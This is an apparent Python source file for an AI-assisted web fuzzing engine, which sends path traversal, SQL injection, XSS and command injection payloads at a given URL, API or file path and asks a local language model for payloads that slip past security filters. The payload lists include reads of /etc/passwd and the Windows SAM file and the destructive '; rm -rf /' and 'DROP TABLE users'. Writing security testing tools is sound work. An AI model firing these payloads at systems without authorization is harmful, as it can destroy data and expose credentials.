#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
PyAgent AI Fuzzing Engine.

Based on the brainstorm repository for AI-powered security testing.
Implements learning-based discovery and intelligent fuzzing capabilities.
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import subprocess
import sys
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

from src.core.base.models.communication_models import CascadeContext

logger = logging.getLogger("pyagent.security.fuzzing")


class FuzzingTarget(Enum):
    """Types of targets for fuzzing."""
    WEB_URL = "web_url"
    API_ENDPOINT = "api_endpoint"
    FILE_PATH = "file_path"
    NETWORK_HOST = "network_host"
    APPLICATION = "application"


class FuzzingTechnique(Enum):
    """Fuzzing techniques available."""
    PATH_TRAVERSAL = "path_traversal"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    BUFFER_OVERFLOW = "buffer_overflow"
    FORMAT_STRING = "format_string"
    DIRECTORY_TRAVERSAL = "directory_traversal"


@dataclass
class FuzzingResult:
    """Result of a fuzzing attempt."""
    target: str
    technique: FuzzingTechnique
    payload: str
    response_code: Optional[int] = None
    response_size: Optional[int] = None
    error_detected: bool = False
    vulnerability_type: Optional[str] = None
    confidence: float = 0.0
    timestamp: float = field(default_factory=time.time)
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class FuzzingSession:
    """A fuzzing session configuration."""
    session_id: str
    target: str
    target_type: FuzzingTarget
    techniques: List[FuzzingTechnique]
    max_iterations: int = 1000
    timeout: int = 30
    learning_enabled: bool = True
    results: List[FuzzingResult] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    end_time: Optional[float] = None


class AIFuzzingEngine:
    """
    AI-powered fuzzing engine.

    Implements learning-based discovery and intelligent path generation.
    Based on the brainstorm repository's AI fuzzing approach.
    """

    def __init__(self, ollama_url: str = "http://localhost:11434"):
        self.ollama_url = ollama_url
        self.logger = logging.getLogger("pyagent.security.fuzzing.engine")

        # Fuzzing payloads and patterns
        self.payloads = self._load_default_payloads()
        self.learning_patterns = {}
        self.session_history: List[FuzzingSession] = []

    def _load_default_payloads(self) -> Dict[FuzzingTechnique, List[str]]:
        """Load default fuzzing payloads."""
        return {
            FuzzingTechnique.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd"
            ],
            FuzzingTechnique.SQL_INJECTION: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin' --",
                "' OR 1=1 --"
            ],
            FuzzingTechnique.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>"
            ],
            FuzzingTechnique.COMMAND_INJECTION: [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(cat /etc/passwd)",
                "; rm -rf /"
            ],
            FuzzingTechnique.DIRECTORY_TRAVERSAL: [
                "../../../../",
                "..\\..\\..\\",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
                ".../...//",
                "....\\/"
            ]
        }

    async def start_fuzzing_session(self, target: str, target_type: FuzzingTarget,
                                   techniques: Optional[List[FuzzingTechnique]] = None,
                                   max_iterations: int = 1000) -> str:
        """
        Start a new fuzzing session.

        Args:
            target: Target to fuzz
            target_type: Type of target
            techniques: Fuzzing techniques to use
            max_iterations: Maximum number of fuzzing iterations

        Returns:
            Session ID
        """
        session_id = f"fuzz_{int(time.time())}_{random.randint(1000, 9999)}"

        if techniques is None:
            techniques = list(FuzzingTechnique)

        session = FuzzingSession(
            session_id=session_id,
            target=target,
            target_type=target_type,
            techniques=techniques,
            max_iterations=max_iterations
        )

        self.session_history.append(session)

        self.logger.info(f"Started fuzzing session {session_id} for target {target}")
        return session_id

    async def run_fuzzing_session(self, session_id: str) -> List[FuzzingResult]:
        """
        Run a fuzzing session.

        Args:
            session_id: Session ID to run

        Returns:
            List of fuzzing results
        """
        session = next((s for s in self.session_history if s.session_id == session_id), None)
        if not session:
            raise ValueError(f"Session {session_id} not found")

        self.logger.info(f"Running fuzzing session {session_id}")

        results = []

        # Initial discovery phase
        if session.target_type == FuzzingTarget.WEB_URL:
            discovery_results = await self._web_discovery_phase(session)
            results.extend(discovery_results)

        # Main fuzzing phase
        for technique in session.techniques:
            technique_results = await self._fuzz_technique(session, technique)
            results.extend(technique_results)

            # Break if we've hit max iterations
            if len(results) >= session.max_iterations:
                break

        # Learning phase - analyze results and generate new payloads
        if session.learning_enabled:
            await self._learning_phase(session, results)

        session.results = results
        session.end_time = time.time()

        self.logger.info(f"Completed fuzzing session {session_id} with {len(results)} results")
        return results

    async def _web_discovery_phase(self, session: FuzzingSession) -> List[FuzzingResult]:
        """Perform web discovery to find fuzzing targets."""
        results = []

        try:
            self.logger.info(f"Starting web discovery for {session.target}")

            # Extract links from main page
            response = requests.get(session.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            links = []
            for a in soup.find_all('a', href=True)[:25]:  # Limit to 25 links
                href = a['href']
                if href and not href.startswith(('#', 'javascript:', 'mailto:')):
                    if href.startswith(('http://', 'https://')):
                        href = urlparse(href).path
                    if href.startswith('/'):
                        href = href[1:]
                    if href:
                        links.append(href)

            # Create discovery results
            for link in links:
                result = FuzzingResult(
                    target=urljoin(session.target, link),
                    technique=FuzzingTechnique.PATH_TRAVERSAL,
                    payload=link,
                    response_code=response.status_code,
                    response_size=len(response.text),
                    metadata={'phase': 'discovery', 'link_count': len(links)}
                )
                results.append(result)

        except Exception as e:
            self.logger.error(f"Web discovery failed: {e}")

        return results

    async def _fuzz_technique(self, session: FuzzingSession, technique: FuzzingTechnique) -> List[FuzzingResult]:
        """Fuzz using a specific technique."""
        results = []

        # Get base payloads for this technique
        base_payloads = self.payloads.get(technique, [])

        # Generate additional payloads using AI if learning is enabled
        if session.learning_enabled:
            ai_payloads = await self._generate_ai_payloads(session, technique, base_payloads)
            all_payloads = base_payloads + ai_payloads
        else:
            all_payloads = base_payloads

        # Limit payloads to prevent excessive fuzzing
        all_payloads = all_payloads[:50]

        for payload in all_payloads:
            try:
                result = await self._execute_payload(session, technique, payload)
                results.append(result)

                # Early exit if we find a vulnerability
                if result.error_detected and result.confidence > 0.8:
                    self.logger.warning(f"High-confidence vulnerability detected: {result.vulnerability_type}")
                    break

            except Exception as e:
                self.logger.error(f"Payload execution failed: {e}")

        return results

    async def _generate_ai_payloads(self, session: FuzzingSession, technique: FuzzingTechnique,
                                   base_payloads: List[str]) -> List[str]:
        """Generate new payloads using AI."""
        try:
            # Create prompt for AI payload generation
            prompt = f"""Generate 5 new {technique.value} payloads for fuzzing.

Existing payloads:
{chr(10).join(base_payloads[:3])}

Target: {session.target}

Generate payloads that might bypass security filters. Return only the payloads, one per line."""

            ai_payloads = await self._call_ollama(prompt)

            # Parse the response
            payloads = [line.strip() for line in ai_payloads.split('\n') if line.strip()]
            return payloads[:5]  # Limit to 5 new payloads

        except Exception as e:
            self.logger.warning(f"AI payload generation failed: {e}")
            return []

    async def _call_ollama(self, prompt: str, model: str = "qwen2.5-coder:latest") -> str:
        """Call Ollama API for AI-generated content."""
        try:
            response = requests.post(
                f"{self.ollama_url}/api/generate",
                json={
                    "model": model,
                    "prompt": prompt,
                    "stream": False
                },
                timeout=30
            )
            response.raise_for_status()
            return response.json()['response']
        except Exception as e:
            self.logger.error(f"Ollama API call failed: {e}")
            return ""

    async def _execute_payload(self, session: FuzzingSession, technique: FuzzingTechnique,
                              payload: str) -> FuzzingResult:
        """Execute a fuzzing payload against the target."""
        result = FuzzingResult(
            target=session.target,
            technique=technique,
            payload=payload
        )

        try:
            if session.target_type == FuzzingTarget.WEB_URL:
                result = await self._execute_web_payload(session.target, technique, payload)
            elif session.target_type == FuzzingTarget.API_ENDPOINT:
                result = await self._execute_api_payload(session.target, technique, payload)
            elif session.target_type == FuzzingTarget.FILE_PATH:
                result = await self._execute_file_payload(session.target, technique, payload)
            else:
                # Generic execution
                result.response_code = 200
                result.response_size = 0

            # Analyze result for vulnerabilities
            await self._analyze_result(result)

        except Exception as e:
            self.logger.error(f"Payload execution error: {e}")
            result.error_detected = True
            result.vulnerability_type = "execution_error"

        return result

    async def _execute_web_payload(self, target: str, technique: FuzzingTechnique,
                                  payload: str) -> FuzzingResult:
        """Execute payload against web target."""
        result = FuzzingResult(target=target, technique=technique, payload=payload)

        try:
            # Construct URL with payload
            if technique == FuzzingTechnique.PATH_TRAVERSAL:
                url = urljoin(target, payload)
            else:
                # For other techniques, append as query parameter
                url = f"{target}?input={payload}"

            response = requests.get(url, timeout=10)
            result.response_code = response.status_code
            result.response_size = len(response.text)

            # Store response for analysis
            result.metadata['response_headers'] = dict(response.headers)
            result.metadata['response_preview'] = response.text[:500]

        except requests.RequestException as e:
            result.error_detected = True
            result.metadata['error'] = str(e)

        return result

    async def _execute_api_payload(self, target: str, technique: FuzzingTechnique,
                                  payload: str) -> FuzzingResult:
        """Execute payload against API endpoint."""
        result = FuzzingResult(target=target, technique=technique, payload=payload)

        try:
            # Send payload as JSON
            response = requests.post(
                target,
                json={"input": payload},
                timeout=10
            )
            result.response_code = response.status_code
            result.response_size = len(response.text)
            result.metadata['response'] = response.text[:500]

        except requests.RequestException as e:
            result.error_detected = True
            result.metadata['error'] = str(e)

        return result

    async def _execute_file_payload(self, target: str, technique: FuzzingTechnique,
                                   payload: str) -> FuzzingResult:
        """Execute payload against file system."""
        result = FuzzingResult(target=target, technique=technique, payload=payload)

        try:
            # Construct file path
            file_path = os.path.join(target, payload)

            # Check if file exists (simulating file access)
            if os.path.exists(file_path):
                result.response_code = 200
                result.metadata['file_exists'] = True
                result.metadata['file_size'] = os.path.getsize(file_path)
            else:
                result.response_code = 404
                result.metadata['file_exists'] = False

        except Exception as e:
            result.error_detected = True
            result.metadata['error'] = str(e)

        return result

    async def _analyze_result(self, result: FuzzingResult):
        """Analyze fuzzing result for vulnerabilities."""
        # Simple pattern-based analysis
        if result.response_code == 200 and result.technique == FuzzingTechnique.PATH_TRAVERSAL:
            # Check for file content in response
            response_text = result.metadata.get('response_preview', '')
            if any(keyword in response_text.lower() for keyword in ['root:', 'daemon:', 'bin/bash']):
                result.error_detected = True
                result.vulnerability_type = "path_traversal"
                result.confidence = 0.9

        elif result.technique == FuzzingTechnique.SQL_INJECTION:
            # Check for SQL errors
            response_text = result.metadata.get('response', '')
            sql_errors = ['sql syntax', 'mysql error', 'sqlite error', 'postgresql error']
            if any(error in response_text.lower() for error in sql_errors):
                result.error_detected = True
                result.vulnerability_type = "sql_injection"
                result.confidence = 0.8

        elif result.technique == FuzzingTechnique.XSS:
            # Check if payload is reflected
            response_text = result.metadata.get('response_preview', '')
            if result.payload in response_text:
                result.error_detected = True
                result.vulnerability_type = "xss_reflected"
                result.confidence = 0.7

    async def _learning_phase(self, session: FuzzingSession, results: List[FuzzingResult]):
        """Learning phase - analyze results and improve future fuzzing."""
        # Analyze successful payloads
        successful_payloads = [r for r in results if r.error_detected]

        if successful_payloads:
            # Update learning patterns
            for result in successful_payloads:
                technique = result.technique.value
                if technique not in self.learning_patterns:
                    self.learning_patterns[technique] = []

                # Add successful pattern
                pattern = {
                    'payload': result.payload,
                    'vulnerability': result.vulnerability_type,
                    'confidence': result.confidence,
                    'target_type': session.target_type.value
                }
                self.learning_patterns[technique].append(pattern)

            self.logger.info(f"Learned {len(successful_payloads)} new patterns from session {session.session_id}")

    def get_session_results(self, session_id: str) -> Optional[List[FuzzingResult]]:
        """Get results from a completed session."""
        session = next((s for s in self.session_history if s.session_id == session_id), None)
        return session.results if session else None

    def get_vulnerability_summary(self) -> Dict[str, Any]:
        """Get summary of all detected vulnerabilities."""
        all_results = []
        for session in self.session_history:
            all_results.extend(session.results)

        vulnerabilities = [r for r in all_results if r.error_detected]

        summary = {
            'total_sessions': len(self.session_history),
            'total_results': len(all_results),
            'vulnerabilities_found': len(vulnerabilities),
            'vulnerability_types': {},
            'high_confidence_findings': len([r for r in vulnerabilities if r.confidence > 0.8])
        }

        # Count vulnerability types
        for vuln in vulnerabilities:
            vuln_type = vuln.vulnerability_type or 'unknown'
            summary['vulnerability_types'][vuln_type] = summary['vulnerability_types'].get(vuln_type, 0) + 1

        return summary


class MultiCycleFuzzing:
    """
    Iterative fuzzing with multiple cycles of improvement.

    Runs fuzzing sessions iteratively, learning from each cycle.
    """

    def __init__(self, fuzzing_engine: AIFuzzingEngine):
        self.engine = fuzzing_engine
        self.logger = logging.getLogger("pyagent.security.fuzzing.multicycle")

    async def run_multi_cycle_fuzzing(self, target: str, target_type: FuzzingTarget,
                                     cycles: int = 3, techniques: Optional[List[FuzzingTechnique]] = None) -> Dict[str, Any]:
        """
        Run multi-cycle fuzzing with iterative improvement.

        Args:
            target: Target to fuzz
            target_type: Type of target
            cycles: Number of fuzzing cycles
            techniques: Fuzzing techniques to use

        Returns:
            Multi-cycle results summary
        """
        self.logger.info(f"Starting multi-cycle fuzzing for {target} with {cycles} cycles")

        all_sessions = []
        cumulative_findings = []

        for cycle in range(1, cycles + 1):
            self.logger.info(f"Starting cycle {cycle}/{cycles}")

            # Start new session
            session_id = await self.engine.start_fuzzing_session(
                target=target,
                target_type=target_type,
                techniques=techniques,
                max_iterations=500  # Shorter sessions for multi-cycle
            )

            # Run the session
            results = await self.engine.run_fuzzing_session(session_id)
            all_sessions.append(session_id)

            # Analyze findings
            cycle_findings = [r for r in results if r.error_detected]
            cumulative_findings.extend(cycle_findings)

            self.logger.info(f"Cycle {cycle} found {len(cycle_findings)} vulnerabilities")

            # If we found high-confidence vulnerabilities, we might stop early
            high_confidence = [r for r in cycle_findings if r.confidence > 0.8]
            if high_confidence:
                self.logger.warning(f"High-confidence vulnerabilities found in cycle {cycle}, stopping early")
                break

            # Learning phase between cycles
            await asyncio.sleep(1)  # Brief pause for learning

        # Generate final summary
        summary = {
            'target': target,
            'cycles_completed': len(all_sessions),
            'total_findings': len(cumulative_findings),
            'sessions': all_sessions,
            'high_confidence_findings': len([r for r in cumulative_findings if r.confidence > 0.8]),
            'vulnerability_breakdown': {}
        }

        # Breakdown by vulnerability type
        for finding in cumulative_findings:
            vuln_type = finding.vulnerability_type or 'unknown'
            summary['vulnerability_breakdown'][vuln_type] = summary['vulnerability_breakdown'].get(vuln_type, 0) + 1

        self.logger.info(f"Multi-cycle fuzzing complete: {summary['total_findings']} total findings")
        return summary</content>
<parameter name="filePath">c:\DEV\PyAgent\src\tools\security\fuzzing.py